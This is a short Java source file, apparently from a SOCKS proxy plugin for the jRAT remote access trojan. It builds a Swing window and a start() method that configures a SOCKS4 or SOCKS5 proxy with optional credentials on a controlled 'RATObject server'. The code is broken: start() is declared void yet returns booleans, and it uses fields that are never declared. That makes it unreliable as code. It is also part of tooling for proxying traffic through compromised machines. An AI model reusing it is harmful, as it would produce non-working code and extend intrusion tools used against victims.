package se.jrat.plugin.socks.client;

import java.awt.BorderLayout;

import javax.swing.JFrame;
import javax.swing.JPanel;
import javax.swing.border.EmptyBorder;

import socks.Socks4Proxy;
import socks.Socks5Proxy;
import socks.UserPasswordAuthentication;
import jrat.api.RATObject;

@SuppressWarnings("serial")
public class FrameSocks extends JFrame {

	private JPanel contentPane;

	public FrameSocks(RATObject server) {
		setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
		setBounds(100, 100, 450, 300);
		contentPane = new JPanel();
		contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
		contentPane.setLayout(new BorderLayout(0, 0));
		setContentPane(contentPane);
	}
	
	private void start() {
		try {
			if (socks_group.getSelectedCheckbox() == socks5radio) {
				proxy = new Socks5Proxy(host, port);
				if (up_check.getState())
					((Socks5Proxy) proxy).setAuthenticationMethod(2, new UserPasswordAuthentication(user, password));
				if (!none_check.getState())
					((Socks5Proxy) proxy).setAuthenticationMethod(0, null);
			} else
				proxy = new Socks4Proxy(host, port, user);
		} catch (java.net.UnknownHostException uhe) {
			return false;
		}
		proxy.directHosts = ir;
		return true;
	}

}
